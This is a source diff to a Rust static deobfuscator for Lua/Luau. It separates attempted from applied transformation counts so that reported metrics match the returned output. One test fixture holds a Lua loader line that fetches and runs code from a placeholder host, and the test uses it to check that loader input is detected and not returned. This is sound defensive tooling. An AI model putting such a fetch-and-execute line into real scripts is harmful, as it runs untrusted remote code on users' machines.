@@ -2,7 +2,7 @@ use std::alloc::{alloc as raw_alloc, dealloc as raw_dealloc, Layout};
 use std::slice;
 use std::str;
 
-const VERSION: &str = "0.4.0";
+const VERSION: &str = "0.4.1";
 static mut LAST_OUTPUT_LEN: usize = 0;
 
 #[no_mangle]
@@ -195,7 +195,7 @@ fn analyze_source(source: &str) -> String {
     issues.extend(delimiter_issues);
     let findings = source_findings(source);
 
-    let transformations = comments_removed + strings_normalized + long_strings_normalized
+    let transformations_attempted = comments_removed + strings_normalized + long_strings_normalized
         + expressions_folded + static_calls_folded + locals_propagated
         + table_indices_folded + branches_removed;
     let bytes = source.as_bytes().len();
@@ -206,11 +206,23 @@ fn analyze_source(source: &str) -> String {
         "Lua/Luau source"
     };
     let source_changed = output != source;
-    let output_for_result = if !looks_like_loader && transformations > 0 && source_changed {
+    let output_for_result = if !looks_like_loader && transformations_attempted > 0 && source_changed {
         output.as_str()
     } else {
         ""
     };
+    let has_output = !output_for_result.is_empty();
+    // Metrics shown as applied transformations must describe the actual returned output.
+    // Keep attempted edits separate for debugging no-output results and loader-only input.
+    let transformations = if has_output { transformations_attempted } else { 0 };
+    let metric_comments_removed = if has_output { comments_removed } else { 0 };
+    let metric_strings_normalized = if has_output { strings_normalized } else { 0 };
+    let metric_long_strings_normalized = if has_output { long_strings_normalized } else { 0 };
+    let metric_expressions_folded = if has_output { expressions_folded } else { 0 };
+    let metric_static_calls_folded = if has_output { static_calls_folded } else { 0 };
+    let metric_locals_propagated = if has_output { locals_propagated } else { 0 };
+    let metric_table_indices_folded = if has_output { table_indices_folded } else { 0 };
+    let metric_branches_removed = if has_output { branches_removed } else { 0 };
     let summary = if looks_like_loader {
         "Loader detected, but the protected payload is not present in this input. No remote content was fetched and no script was executed.".to_string()
     } else if transformations == 0 || !source_changed {
@@ -224,7 +236,7 @@ fn analyze_source(source: &str) -> String {
     };
 
     format!(
-        "{{\"ok\":true,\"engine\":\"Deobfuscator Lab Rust\",\"version\":\"{}\",\"mode\":\"source\",\"format\":\"{}\",\"summary\":\"{}\",\"output\":\"{}\",\"metrics\":{{\"bytes\":{},\"characters\":{},\"output_bytes\":{},\"comments_removed\":{},\"strings_normalized\":{},\"long_strings_normalized\":{},\"constant_expressions_folded\":{},\"static_calls_folded\":{},\"local_constants_propagated\":{},\"constant_table_indices_folded\":{},\"constant_branches_removed\":{},\"transformations_total\":{},\"analysis_rounds\":{},\"analysis_passes\":{},\"analysis_round_limit\":32,\"delimiter_check\":\"{}\",\"source_changed\":{}}},\"findings\":{},\"warnings\":{},\"scope\":\"Deterministic static source recovery; no script execution, network access, or model calls. Only understood constant expressions, selected pure string calls, simple local constants, and provably constant branches are rewritten. Unsupported syntax is preserved.\"}}",
+        "{{\"ok\":true,\"engine\":\"Deobfuscator Lab Rust\",\"version\":\"{}\",\"mode\":\"source\",\"format\":\"{}\",\"summary\":\"{}\",\"output\":\"{}\",\"metrics\":{{\"bytes\":{},\"characters\":{},\"output_bytes\":{},\"comments_removed\":{},\"strings_normalized\":{},\"long_strings_normalized\":{},\"constant_expressions_folded\":{},\"static_calls_folded\":{},\"local_constants_propagated\":{},\"constant_table_indices_folded\":{},\"constant_branches_removed\":{},\"transformations_total\":{},\"transformations_attempted_total\":{},\"analysis_rounds\":{},\"analysis_passes\":{},\"analysis_round_limit\":32,\"delimiter_check\":\"{}\",\"source_changed\":{}}},\"findings\":{},\"warnings\":{},\"scope\":\"Deterministic static source recovery; no script execution, network access, or model calls. Only understood constant expressions, selected pure string calls, simple local constants, and provably constant branches are rewritten. Unsupported syntax is preserved.\"}}",
         VERSION,
         json_escape(format_name),
         json_escape(&summary),
@@ -232,15 +244,16 @@ fn analyze_source(source: &str) -> String {
         bytes,
         chars,
         output_for_result.as_bytes().len(),
-        comments_removed,
-        strings_normalized,
-        long_strings_normalized,
-        expressions_folded,
-        static_calls_folded,
-        locals_propagated,
-        table_indices_folded,
-        branches_removed,
+        metric_comments_removed,
+        metric_strings_normalized,
+        metric_long_strings_normalized,
+        metric_expressions_folded,
+        metric_static_calls_folded,
+        metric_locals_propagated,
+        metric_table_indices_folded,
+        metric_branches_removed,
         transformations,
+        transformations_attempted,
         analysis_rounds,
         analysis_rounds * 5,
         if delimiter_ok { "balanced" } else { "mismatch" },
@@ -2138,12 +2151,14 @@ mod tests {
     #[test]
     fn loader_input_is_not_returned_as_recovered_source() {
         let response = analyze_source(
-            "loadstring(game:HttpGet(\"https://example.invalid/payload\"))()"
+            "-- comment that must not be counted as recovered output\nloadstring(game:HttpGet(\"https://example.invalid/payload\"))()"
         );
         assert!(response.contains("\"format\":\"Lua/Luau dynamic loader\""));
         assert!(response.contains("\"output\":\"\""), "loader should not be shown as recovered source: {}", response);
         assert!(response.contains("payload is not present"));
         assert!(response.contains("\"transformations_total\":0"));
+        assert!(response.contains("\"transformations_attempted_total\":1"),
+            "attempted normalization should be tracked separately from returned code: {}", response);
     }
 
     #[test]
